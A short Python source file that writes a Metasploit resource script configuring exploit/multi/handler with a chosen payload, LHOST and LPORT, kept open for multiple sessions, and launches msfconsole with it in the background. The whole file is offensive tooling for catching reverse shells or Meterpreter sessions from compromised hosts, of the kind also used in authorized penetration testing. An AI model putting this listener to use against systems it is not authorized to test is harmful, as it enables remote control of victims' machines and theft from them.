import subprocess
import os

def create_msf_listener_rc(payload, lhost, lport):
    os.makedirs("output", exist_ok=True)
    rc_path = "output/msf_listener.rc"
    with open(rc_path, "w") as f:
        f.write("use exploit/multi/handler\n")
        f.write(f"set PAYLOAD {payload}\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        f.write("set ExitOnSession false\n")
        f.write("exploit -j -z\n")
    return rc_path

def run_msf_listener(rc_path):
    return subprocess.Popen(
        ["msfconsole", "-r", rc_path],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )
